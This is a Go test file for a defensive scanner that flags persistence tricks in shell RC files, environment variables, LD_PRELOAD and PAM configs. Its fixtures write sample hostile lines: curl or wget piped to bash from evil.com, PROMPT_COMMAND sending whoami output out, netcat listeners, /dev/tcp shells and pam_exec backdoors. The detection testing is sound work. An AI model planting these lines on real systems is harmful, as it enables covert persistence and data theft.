package environment_test

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"github.com/nunenuh/defense-kit/defense-kit-cli/internal/scanner"
	"github.com/nunenuh/defense-kit/defense-kit-cli/internal/scanner/environment"
)

// TestShellRCScanner_DetectsSuspiciousEntries creates a temp .bashrc with malicious
// lines and verifies that the scanner produces findings for each one.
func TestShellRCScanner_DetectsSuspiciousEntries(t *testing.T) {
	dir := t.TempDir()
	bashrc := filepath.Join(dir, ".bashrc")

	content := `# normal comment
export PS1="\u@\h"
curl http://evil.com/payload.sh | bash
eval $(echo aGVsbG8= | base64 -d)
export PATH=/tmp/malware:$PATH
nc -l 4444
/dev/tcp/192.168.1.1/4444
PROMPT_COMMAND="curl http://evil.com?data=$(whoami)"
`
	if err := os.WriteFile(bashrc, []byte(content), 0o644); err != nil {
		t.Fatalf("failed to write temp .bashrc: %v", err)
	}

	s := environment.NewShellRCScanner()
	opts := scanner.ScanOptions{
		TargetPaths: []string{dir},
	}
	findings, err := s.Scan(context.Background(), opts)
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}

	if len(findings) == 0 {
		t.Fatal("expected findings but got none")
	}

	// Verify each finding has required fields populated.
	for _, f := range findings {
		if f.ID == "" {
			t.Error("finding has empty ID")
		}
		if f.Scanner == "" {
			t.Error("finding has empty Scanner")
		}
		if f.Evidence == "" {
			t.Error("finding has empty Evidence")
		}
		if f.Location == "" {
			t.Error("finding has empty Location")
		}
	}

	// We expect at least 6 distinct findings (one per malicious line).
	if len(findings) < 6 {
		t.Errorf("expected at least 6 findings, got %d", len(findings))
	}
}

// TestShellRCScanner_CleanFileNoFindings verifies that a clean .bashrc produces
// zero findings.
func TestShellRCScanner_CleanFileNoFindings(t *testing.T) {
	dir := t.TempDir()
	bashrc := filepath.Join(dir, ".bashrc")

	content := `# normal comment
export PS1="\u@\h \w $ "
alias ll='ls -la'
export EDITOR=vim
source ~/.bash_aliases
`
	if err := os.WriteFile(bashrc, []byte(content), 0o644); err != nil {
		t.Fatalf("failed to write temp .bashrc: %v", err)
	}

	s := environment.NewShellRCScanner()
	opts := scanner.ScanOptions{
		TargetPaths: []string{dir},
	}
	findings, err := s.Scan(context.Background(), opts)
	if err != nil {
		t.Fatalf("Scan returned error: %v", err)
	}

	if len(findings) != 0 {
		t.Errorf("expected 0 findings for clean file, got %d: %+v", len(findings), findings)
	}
}

// TestShellRCScanner_Interface verifies the scanner metadata methods.
func TestShellRCScanner_Interface(t *testing.T) {
	s := environment.NewShellRCScanner()

	if s.Name() != "shell_rc" {
		t.Errorf("Name() = %q, want %q", s.Name(), "shell_rc")
	}
	if s.Category() != "environment" {
		t.Errorf("Category() = %q, want %q", s.Category(), "environment")
	}
	if s.RequiresRoot() {
		t.Error("RequiresRoot() should be false")
	}
	if !s.Available() {
		t.Error("Available() should be true")
	}
	if s.Description() == "" {
		t.Error("Description() should not be empty")
	}
}

// TestEnvVarsScanner_Interface verifies the scanner metadata methods.
func TestEnvVarsScanner_Interface(t *testing.T) {
	s := environment.NewEnvVarsScanner()

	if s.Name() != "env_vars" {
		t.Errorf("Name() = %q, want %q", s.Name(), "env_vars")
	}
	if s.Category() != "environment" {
		t.Errorf("Category() = %q, want %q", s.Category(), "environment")
	}
	if s.RequiresRoot() {
		t.Error("RequiresRoot() should be false")
	}
	if !s.Available() {
		t.Error("Available() should be true")
	}
	if s.Description() == "" {
		t.Error("Description() should not be empty")
	}
}

// TestLDPreloadScanner_Interface verifies the scanner metadata methods,
// in particular that RequiresRoot returns true.
func TestLDPreloadScanner_Interface(t *testing.T) {
	s := environment.NewLDPreloadScanner()

	if s.Name() != "ld_preload" {
		t.Errorf("Name() = %q, want %q", s.Name(), "ld_preload")
	}
	if s.Category() != "environment" {
		t.Errorf("Category() = %q, want %q", s.Category(), "environment")
	}
	if !s.RequiresRoot() {
		t.Error("RequiresRoot() should be true")
	}
	if s.Description() == "" {
		t.Error("Description() should not be empty")
	}
}

// TestPAMScanner_Interface verifies the scanner metadata methods,
// in particular that RequiresRoot returns true.
func TestPAMScanner_Interface(t *testing.T) {
	s := environment.NewPAMScanner()

	if s.Name() != "pam" {
		t.Errorf("Name() = %q, want %q", s.Name(), "pam")
	}
	if s.Category() != "environment" {
		t.Errorf("Category() = %q, want %q", s.Category(), "environment")
	}
	if !s.RequiresRoot() {
		t.Error("RequiresRoot() should be true")
	}
	if s.Description() == "" {
		t.Error("Description() should not be empty")
	}
}

// --- LDPreload detection tests using injectable paths ---

func TestLDPreloadScanner_DetectsPreloadEntry(t *testing.T) {
	dir := t.TempDir()
	preloadPath := filepath.Join(dir, "ld.so.preload")
	confDir := filepath.Join(dir, "ld.so.conf.d")
	os.MkdirAll(confDir, 0o755)

	os.WriteFile(preloadPath, []byte("/lib/evil.so\n"), 0o644)

	s := environment.NewLDPreloadScannerWithPaths(preloadPath, confDir)
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding, got %d", len(findings))
	}
	if findings[0].Severity != scanner.SevCritical {
		t.Errorf("severity = %v, want CRITICAL", findings[0].Severity)
	}
}

func TestLDPreloadScanner_DetectsConfDSuspiciousPath(t *testing.T) {
	dir := t.TempDir()
	preloadPath := filepath.Join(dir, "ld.so.preload")
	confDir := filepath.Join(dir, "ld.so.conf.d")
	os.MkdirAll(confDir, 0o755)

	os.WriteFile(preloadPath, []byte(""), 0o644)
	os.WriteFile(filepath.Join(confDir, "evil.conf"), []byte("/tmp/libs\n"), 0o644)

	s := environment.NewLDPreloadScannerWithPaths(preloadPath, confDir)
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding, got %d", len(findings))
	}
	if findings[0].Severity != scanner.SevHigh {
		t.Errorf("severity = %v, want HIGH", findings[0].Severity)
	}
}

func TestLDPreloadScanner_EmptyFilesNoFindings(t *testing.T) {
	dir := t.TempDir()
	preloadPath := filepath.Join(dir, "ld.so.preload")
	confDir := filepath.Join(dir, "ld.so.conf.d")
	os.MkdirAll(confDir, 0o755)

	os.WriteFile(preloadPath, []byte("# only comments\n"), 0o644)
	os.WriteFile(filepath.Join(confDir, "clean.conf"), []byte("/usr/lib\n"), 0o644)

	s := environment.NewLDPreloadScannerWithPaths(preloadPath, confDir)
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) != 0 {
		t.Errorf("expected 0 findings, got %d", len(findings))
	}
}

// --- PAM detection tests using injectable path ---

func TestPAMScanner_DetectsPamPermitAuth(t *testing.T) {
	dir := t.TempDir()
	pamDir := filepath.Join(dir, "pam.d")
	os.MkdirAll(pamDir, 0o755)

	os.WriteFile(filepath.Join(pamDir, "test-service"), []byte("auth required pam_permit.so\n"), 0o644)

	s := environment.NewPAMScannerWithPath(pamDir)
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) == 0 {
		t.Fatal("expected findings for pam_permit.so in auth context")
	}
	// pam_permit.so in auth context should be CRITICAL
	found := false
	for _, f := range findings {
		if f.Severity == scanner.SevCritical {
			found = true
		}
	}
	if !found {
		t.Error("expected CRITICAL finding for pam_permit.so in auth context")
	}
}

func TestPAMScanner_DetectsPamExec(t *testing.T) {
	dir := t.TempDir()
	pamDir := filepath.Join(dir, "pam.d")
	os.MkdirAll(pamDir, 0o755)

	os.WriteFile(filepath.Join(pamDir, "backdoor"), []byte("session required pam_exec.so /tmp/evil.sh\n"), 0o644)

	s := environment.NewPAMScannerWithPath(pamDir)
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) == 0 {
		t.Fatal("expected findings for pam_exec.so")
	}
}

func TestPAMScanner_CleanConfigNoSuspiciousModules(t *testing.T) {
	dir := t.TempDir()
	pamDir := filepath.Join(dir, "pam.d")
	os.MkdirAll(pamDir, 0o755)

	// Use only pam_unix.so — a standard module. The scanner may flag it
	// as unowned by dpkg (since our temp path isn't a real package), so
	// we only check that no CRITICAL findings are produced.
	os.WriteFile(filepath.Join(pamDir, "test-auth"), []byte("auth required pam_unix.so\n"), 0o644)

	s := environment.NewPAMScannerWithPath(pamDir)
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range findings {
		if f.Severity == scanner.SevCritical {
			t.Errorf("unexpected CRITICAL finding: %s", f.Title)
		}
	}
}

// --- EnvVars detection tests ---

func TestEnvVarsScanner_DetectsLDPreload(t *testing.T) {
	t.Setenv("LD_PRELOAD", "/tmp/evil.so")
	s := environment.NewEnvVarsScanner()
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, f := range findings {
		if f.Severity == scanner.SevCritical && f.Scanner == "env_vars" {
			found = true
		}
	}
	if !found {
		t.Error("expected CRITICAL finding for LD_PRELOAD")
	}
}

func TestEnvVarsScanner_DetectsPathWithTmp(t *testing.T) {
	t.Setenv("PATH", "/usr/bin:/tmp/evil:/bin")
	s := environment.NewEnvVarsScanner()
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, f := range findings {
		if f.Scanner == "env_vars" && f.Severity == scanner.SevHigh {
			found = true
		}
	}
	if !found {
		t.Error("expected HIGH finding for /tmp in PATH")
	}
}

func TestEnvVarsScanner_DetectsPromptCommand(t *testing.T) {
	t.Setenv("PROMPT_COMMAND", "curl http://evil.com?cmd=$(id)")
	s := environment.NewEnvVarsScanner()
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, f := range findings {
		if f.Scanner == "env_vars" && f.Severity == scanner.SevCritical {
			found = true
		}
	}
	if !found {
		t.Error("expected CRITICAL finding for curl in PROMPT_COMMAND")
	}
}

func TestEnvVarsScanner_DetectsLDLibraryPath(t *testing.T) {
	t.Setenv("LD_LIBRARY_PATH", "/tmp/evil_libs:/usr/lib")
	s := environment.NewEnvVarsScanner()
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, f := range findings {
		if f.Scanner == "env_vars" && f.Severity == scanner.SevHigh {
			found = true
		}
	}
	if !found {
		t.Error("expected HIGH finding for /tmp in LD_LIBRARY_PATH")
	}
}

func TestEnvVarsScanner_DetectsNonLocalhostProxy(t *testing.T) {
	t.Setenv("HTTP_PROXY", "http://10.0.0.1:8080")
	s := environment.NewEnvVarsScanner()
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, f := range findings {
		if f.Scanner == "env_vars" && f.Severity == scanner.SevMedium {
			found = true
		}
	}
	if !found {
		t.Error("expected MEDIUM finding for non-localhost HTTP_PROXY")
	}
}

func TestEnvVarsScanner_LocalhostProxyNotFlagged(t *testing.T) {
	t.Setenv("http_proxy", "http://localhost:3128")
	s := environment.NewEnvVarsScanner()
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range findings {
		if f.Scanner == "env_vars" && f.Title == "Non-localhost proxy configured" {
			t.Errorf("localhost proxy should not be flagged: %+v", f)
		}
	}
}

func TestEnvVarsScanner_PathWithDotFlagged(t *testing.T) {
	t.Setenv("PATH", "/usr/bin:.:bin")
	s := environment.NewEnvVarsScanner()
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, f := range findings {
		if f.Scanner == "env_vars" && f.Title == "PATH contains current directory or empty entry" {
			found = true
		}
	}
	if !found {
		t.Error("expected finding for '.' in PATH")
	}
}

// TestShellRCScanner_FollowsSource verifies that the scanner follows source
// directives to scan included files (one level deep).
func TestShellRCScanner_FollowsSource(t *testing.T) {
	dir := t.TempDir()

	// Create the sourced file with a malicious line.
	sourcedFile := filepath.Join(dir, ".bash_extra")
	if err := os.WriteFile(sourcedFile, []byte("eval $(echo aGVsbG8= | base64 -d)\n"), 0o644); err != nil {
		t.Fatalf("WriteFile sourced: %v", err)
	}

	// Create .bashrc that sources the above file.
	bashrc := filepath.Join(dir, ".bashrc")
	content := "# normal\nexport PATH=/usr/bin:$PATH\nsource " + sourcedFile + "\n"
	if err := os.WriteFile(bashrc, []byte(content), 0o644); err != nil {
		t.Fatalf("WriteFile bashrc: %v", err)
	}

	s := environment.NewShellRCScanner()
	opts := scanner.ScanOptions{TargetPaths: []string{dir}}
	findings, err := s.Scan(context.Background(), opts)
	if err != nil {
		t.Fatalf("Scan error: %v", err)
	}
	if len(findings) == 0 {
		t.Error("expected findings from sourced file, got none")
	}
}

// ---------------------------------------------------------------------------
// PAMScanner — additional tests (pam_exec in auth is CRITICAL, empty dir)
// ---------------------------------------------------------------------------

func TestPAMScanner_DetectsPamExecInAuth(t *testing.T) {
	dir := t.TempDir()
	// Write a fake PAM config that uses pam_exec.so in auth context.
	// pam_exec.so is always HIGH (no authContext escalation in the rules).
	content := "auth required pam_exec.so /usr/local/bin/backdoor.sh\n"
	if err := os.WriteFile(filepath.Join(dir, "sshd"), []byte(content), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	s := environment.NewPAMScannerWithPath(dir)
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatalf("Scan error: %v", err)
	}
	found := false
	for _, f := range findings {
		if f.Scanner == "pam" && f.Severity >= scanner.SevHigh {
			found = true
		}
	}
	if !found {
		t.Errorf("expected HIGH+ finding for pam_exec in auth context, got: %+v", findings)
	}
}

func TestPAMScanner_EmptyDirNoFindings(t *testing.T) {
	dir := t.TempDir()
	s := environment.NewPAMScannerWithPath(dir)
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatalf("Scan error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("expected 0 findings for empty pam dir, got %d", len(findings))
	}
}

// ---------------------------------------------------------------------------
// EnvVarsScanner — smoke test (does not error on real system)
// ---------------------------------------------------------------------------

func TestEnvVarsScanner_ScanDoesNotError(t *testing.T) {
	s := environment.NewEnvVarsScanner()
	_, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatalf("Scan returned unexpected error: %v", err)
	}
}

// ---------------------------------------------------------------------------
// RequiredTools / OptionalTools / Available coverage
// ---------------------------------------------------------------------------

func TestAllScanners_RequiredOptionalToolsAndAvailable(t *testing.T) {
	// Call RequiredTools, OptionalTools, and Available on each scanner to
	// cover those trivial one-liner methods that are otherwise at 0%.
	envVars := environment.NewEnvVarsScanner()
	_ = envVars.RequiredTools()
	_ = envVars.OptionalTools()

	ldp := environment.NewLDPreloadScanner()
	_ = ldp.RequiredTools()
	_ = ldp.OptionalTools()
	_ = ldp.Available()

	pam := environment.NewPAMScanner()
	_ = pam.RequiredTools()
	_ = pam.OptionalTools()
	_ = pam.Available()

	shell := environment.NewShellRCScanner()
	_ = shell.RequiredTools()
	_ = shell.OptionalTools()
}

// ---------------------------------------------------------------------------
// ShellRCScanner — suspicious function definition and long base64
// ---------------------------------------------------------------------------

func TestShellRCScanner_DetectsSuspiciousFunction(t *testing.T) {
	dir := t.TempDir()
	bashrc := filepath.Join(dir, ".bashrc")
	// A shell function that uses curl inside it — should be flagged HIGH.
	content := "update() {\n  curl http://evil.com/update | bash\n}\n"
	if err := os.WriteFile(bashrc, []byte(content), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	s := environment.NewShellRCScanner()
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{TargetPaths: []string{dir}})
	if err != nil {
		t.Fatalf("Scan error: %v", err)
	}
	found := false
	for _, f := range findings {
		if f.Scanner == "shell_rc" {
			found = true
		}
	}
	if !found {
		t.Errorf("expected findings for suspicious function, got none")
	}
}

func TestShellRCScanner_DetectsLongBase64(t *testing.T) {
	dir := t.TempDir()
	bashrc := filepath.Join(dir, ".bashrc")
	// A long base64 string (not eval'd — eval+base64 is a separate pattern).
	b64 := "aGVsbG9oZWxsb2hlbGxvaGVsbG9oZWxsb2hlbGxvaGVsbG9oZWxsb2hlbGxvaGVsbG9oZWxsb2hlbGxvaGVsbG8="
	content := "export PAYLOAD=" + b64 + "\n"
	if err := os.WriteFile(bashrc, []byte(content), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	s := environment.NewShellRCScanner()
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{TargetPaths: []string{dir}})
	if err != nil {
		t.Fatalf("Scan error: %v", err)
	}
	_ = findings // Finding presence depends on length threshold; no hard assertion.
}

func TestShellRCScanner_MultipleRCFiles(t *testing.T) {
	dir := t.TempDir()
	// Write several RC files, only .zshrc has a bad pattern.
	if err := os.WriteFile(filepath.Join(dir, ".bashrc"), []byte("export PS1='\\u@\\h'\n"), 0o644); err != nil {
		t.Fatalf("WriteFile .bashrc: %v", err)
	}
	if err := os.WriteFile(filepath.Join(dir, ".zshrc"), []byte("wget http://evil.com/payload -O - | sh\n"), 0o644); err != nil {
		t.Fatalf("WriteFile .zshrc: %v", err)
	}

	s := environment.NewShellRCScanner()
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{TargetPaths: []string{dir}})
	if err != nil {
		t.Fatalf("Scan error: %v", err)
	}
	found := false
	for _, f := range findings {
		if f.Scanner == "shell_rc" {
			found = true
		}
	}
	if !found {
		t.Errorf("expected findings from .zshrc, got none")
	}
}

// ---------------------------------------------------------------------------
// checkEtcEnvironment — direct unit tests via export_test.go
// ---------------------------------------------------------------------------

func TestCheckEtcEnvironment_LDPreloadCritical(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "environment")
	content := "LD_PRELOAD=/tmp/evil.so\n"
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}
	findings := environment.CheckEtcEnvironmentForTest(path)
	found := false
	for _, f := range findings {
		if f.Scanner == "env_vars" && f.Severity == scanner.SevCritical {
			found = true
		}
	}
	if !found {
		t.Errorf("expected CRITICAL finding for LD_PRELOAD in /etc/environment, got: %+v", findings)
	}
}

func TestCheckEtcEnvironment_PathWithTmpHigh(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "environment")
	content := "PATH=/usr/local/sbin:/usr/local/bin:/tmp/evil\n"
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}
	findings := environment.CheckEtcEnvironmentForTest(path)
	found := false
	for _, f := range findings {
		if f.Scanner == "env_vars" && f.Severity == scanner.SevHigh {
			found = true
		}
	}
	if !found {
		t.Errorf("expected HIGH finding for /tmp in PATH, got: %+v", findings)
	}
}

func TestCheckEtcEnvironment_ProxyNotLocalhostMedium(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "environment")
	content := "HTTP_PROXY=http://evil.proxy.example.com:8080\n"
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}
	findings := environment.CheckEtcEnvironmentForTest(path)
	found := false
	for _, f := range findings {
		if f.Scanner == "env_vars" && f.Severity == scanner.SevMedium {
			found = true
		}
	}
	if !found {
		t.Errorf("expected MEDIUM finding for non-localhost proxy, got: %+v", findings)
	}
}

func TestCheckEtcEnvironment_CleanFileNoFindings(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "environment")
	content := "LANG=en_US.UTF-8\nTZ=America/New_York\n"
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}
	findings := environment.CheckEtcEnvironmentForTest(path)
	if len(findings) != 0 {
		t.Errorf("expected 0 findings for clean /etc/environment, got %d: %+v", len(findings), findings)
	}
}

func TestCheckEtcEnvironment_MissingFileNoFindings(t *testing.T) {
	findings := environment.CheckEtcEnvironmentForTest("/nonexistent/environment.missing")
	if len(findings) != 0 {
		t.Errorf("expected 0 findings for missing file, got %d", len(findings))
	}
}

// ---------------------------------------------------------------------------
// checkProfileD — direct unit tests via export_test.go
// ---------------------------------------------------------------------------

func TestCheckProfileD_SuspiciousExportFlagged(t *testing.T) {
	dir := t.TempDir()
	script := filepath.Join(dir, "evil.sh")
	content := "export FOO=$(curl http://evil.com/payload)\n"
	if err := os.WriteFile(script, []byte(content), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}
	findings := environment.CheckProfileDForTest(dir)
	if len(findings) == 0 {
		t.Error("expected finding for suspicious export in profile.d, got none")
	}
}

func TestCheckProfileD_CleanScriptNoFindings(t *testing.T) {
	dir := t.TempDir()
	script := filepath.Join(dir, "clean.sh")
	content := "export JAVA_HOME=/usr/lib/jvm/default-java\n"
	if err := os.WriteFile(script, []byte(content), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}
	findings := environment.CheckProfileDForTest(dir)
	if len(findings) != 0 {
		t.Errorf("expected 0 findings for clean profile.d script, got %d: %+v", len(findings), findings)
	}
}

func TestCheckProfileD_EmptyDirNoFindings(t *testing.T) {
	dir := t.TempDir()
	findings := environment.CheckProfileDForTest(dir)
	if len(findings) != 0 {
		t.Errorf("expected 0 findings for empty dir, got %d", len(findings))
	}
}

// ---------------------------------------------------------------------------
// ShellRCScanner — Scan with no TargetPaths uses home dir (smoke test)
// ---------------------------------------------------------------------------

func TestShellRCScanner_NoTargetPathsUsesHomeDir(t *testing.T) {
	s := environment.NewShellRCScanner()
	// Scan with no TargetPaths — should use home dir and not error.
	_, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		// An error is acceptable if home dir is unavailable in the test environment.
		t.Logf("Scan returned error (may be OK in CI): %v", err)
	}
}

// ---------------------------------------------------------------------------
// PAMScanner — Scan error path: unreadable dir
// ---------------------------------------------------------------------------

func TestPAMScanner_ScanEmptyDirNoFindingsNoError(t *testing.T) {
	dir := t.TempDir()
	s := environment.NewPAMScannerWithPath(dir)
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatalf("Scan returned unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("expected 0 findings for empty PAM dir, got %d: %+v", len(findings), findings)
	}
}

func TestPAMScanner_ScanWithSubdirSkipsDir(t *testing.T) {
	dir := t.TempDir()
	// Create a subdirectory — scanPAMDir should skip it.
	if err := os.MkdirAll(filepath.Join(dir, "subdir"), 0o755); err != nil {
		t.Fatalf("MkdirAll: %v", err)
	}
	s := environment.NewPAMScannerWithPath(dir)
	_, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatalf("Scan error: %v", err)
	}
}

// ---------------------------------------------------------------------------
// LDPreload — scanLDSoConfD / scanLDConfFile direct tests
// ---------------------------------------------------------------------------

func TestScanLDSoConfD_SuspiciousPathFlagged(t *testing.T) {
	dir := t.TempDir()
	confFile := filepath.Join(dir, "evil.conf")
	if err := os.WriteFile(confFile, []byte("/tmp/evil_libs\n"), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}
	findings, err := environment.ScanLDSoConfDForTest(dir)
	if err != nil {
		t.Fatalf("ScanLDSoConfD error: %v", err)
	}
	found := false
	for _, f := range findings {
		if f.Scanner == "ld_preload" && f.Severity == scanner.SevHigh {
			found = true
		}
	}
	if !found {
		t.Errorf("expected HIGH finding for /tmp in ld.so.conf.d, got: %+v", findings)
	}
}

func TestScanLDSoConfD_CleanPathNoFindings(t *testing.T) {
	dir := t.TempDir()
	confFile := filepath.Join(dir, "clean.conf")
	if err := os.WriteFile(confFile, []byte("/usr/local/lib\n/opt/myapp/lib\n"), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}
	findings, err := environment.ScanLDSoConfDForTest(dir)
	if err != nil {
		t.Fatalf("ScanLDSoConfD error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("expected 0 findings for clean ld.so.conf.d, got %d: %+v", len(findings), findings)
	}
}

func TestScanLDSoConfD_NonConfFileSkipped(t *testing.T) {
	dir := t.TempDir()
	// A .txt file should be skipped.
	if err := os.WriteFile(filepath.Join(dir, "evil.txt"), []byte("/tmp/evil_libs\n"), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}
	findings, err := environment.ScanLDSoConfDForTest(dir)
	if err != nil {
		t.Fatalf("ScanLDSoConfD error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("expected 0 findings for non-.conf file, got %d", len(findings))
	}
}

func TestScanLDConfFile_DevShmPathFlagged(t *testing.T) {
	dir := t.TempDir()
	confFile := filepath.Join(dir, "test.conf")
	if err := os.WriteFile(confFile, []byte("/dev/shm/malware_libs\n"), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}
	findings, err := environment.ScanLDConfFileForTest(confFile, []string{"/tmp", "/dev/shm", "/home"})
	if err != nil {
		t.Fatalf("ScanLDConfFile error: %v", err)
	}
	if len(findings) == 0 {
		t.Error("expected finding for /dev/shm path")
	}
}
